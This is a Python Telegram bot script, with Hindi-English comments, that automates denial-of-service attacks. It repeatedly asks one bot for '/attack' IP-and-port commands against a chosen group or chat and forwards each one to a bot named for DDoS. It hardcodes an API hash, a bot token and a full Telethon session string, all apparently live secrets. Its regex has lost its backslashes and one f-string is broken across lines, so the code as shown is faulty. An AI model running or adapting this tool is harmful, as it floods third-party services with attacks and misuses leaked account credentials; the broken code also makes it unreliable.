import threading
import asyncio
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

API_ID = 36295148
API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # TASK EXECUTER BOT

STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XNO1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2snpHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8vQoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# PTB side state
chat_targets: dict[int, str] = {}          # chat_id -> target
loop_tasks: dict[int, asyncio.Task] = {}   # chat_id -> telethon loop task

# BOT_A response waiters (same idea as old code)
ip_waiters: dict[int, asyncio.Future] = {}  # chat_id -> Future for CMD
bot_b_status = "UNKNOWN"

# /attack extract from "CMD: /attack 91.108.17.5 32001 30"
CMD_LINE_REGEX = re.compile(r"CMD:s*`?(/attacks+S+s+d+s+d+)`?", re.I)


# ------------- BOT-A LISTENER (IP BOT) -------------
@tele.on(events.NewMessage(from_users=BOT_A))
async def bot_a_listener(event):
    text = event.text or ""
    print("IP BOT REPLY:", text)

    # Purane code ki tarah CMD line nikaalo
    m = CMD_LINE_REGEX.search(text)
    if not m:
        return

    attack_cmd = m.group(1)
    print("✅ EXTRACTED CMD:", attack_cmd)

    # Sare pending chats ko CMD de do (per-chat mapping)
    for chat_id, fut in list(ip_waiters.items()):
        if not fut.done():
            fut.set_result(attack_cmd)
        ip_waiters.pop(chat_id, None)


# ------------- BOT-B LISTENER (TASK BOT) -------------
@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    global bot_b_status
    t = (event.text or "").lower()
    if "ready" in t:
        bot_b_status = "READY"
    elif "running" in t:
        bot_b_status = "RUNNING"
    elif "cooldown" in t:
        bot_b_status = "COOLDOWN"
    else:
        bot_b_status = "UNKNOWN"


# ------------- CORE LOOP PER CHAT (Telethon loop) -------------
async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Har chat ke liye: IP BOT se CMD lo, BOT_B ko bhejo, loop repeat."""
    global bot_b_status

    while True:
        target = chat_targets.get(chat_id)
        if not target:
            return

        # 1) IP BOT se .getip all <target> maango
        fut = tele.loop.create_future()
        ip_waiters[chat_id] = fut

        await tele.send_message(BOT_A, f".getip all {target}")
        await context.bot.send_message(chat_id, "📡 Asking IP bot for CMD…")

        try:
            attack_cmd = await asyncio.wait_for(fut, timeout=60)
        except asyncio.TimeoutError:
            await context.bot.send_message(chat_id, "⏱️ IP bot timeout, retrying…")
            ip_waiters.pop(chat_id, None)
            await asyncio.sleep(5)
            continue

        # 2) BOT_B READY hone tak wait
        while True:
            await tele.send_message(BOT_B, "/status")
            await asyncio.sleep(2)
            if bot_b_status == "READY":
                break
            await asyncio.sleep(5)

        # 3) BOT_B ko /attack bhejo
        await tele.send_message(BOT_B, attack_cmd)
        await context.bot.send_message(
            chat_id,
            f"✅ Task sent:
`{attack_cmd}`",
            parse_mode="Markdown",
        )
        await asyncio.sleep(3)


# ------------- PTB COMMANDS -------------
async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
        return

    chat_targets[update.effective_chat.id] = " ".join(context.args)
    await update.message.reply_text("✅ Link / ChatID saved")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if cid in loop_tasks:
        await update.message.reply_text("⚠️ Loop already running")
        return

    task = tele.loop.create_task(telethon_loop(cid, context))
    loop_tasks[cid] = task
    await update.message.reply_text("🔁 Loop started")


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    task = loop_tasks.pop(cid, None)
    if task:
        task.cancel()
        await update.message.reply_text("🛑 Loop stopped")
    else:
        await update.message.reply_text("No active loop running")


# ------------- TELETHON RUNNER (SEPARATE THREAD) -------------
def start_telethon():
    asyncio.run(run_telethon())


async def run_telethon():
    await tele.start()
    print("🧵 Telethon connected")
    await tele.run_until_disconnected()


# ------------- MAIN (SYNC PTB) -------------
def main():
    t = threading.Thread(target=start_telethon, daemon=True)
    t.start()

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("setlinkchatid", setlink))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("stoploop", stoploop))

    print("🤖 Control bot running")
    app.run_polling()


if __name__ == "__main__":
    main()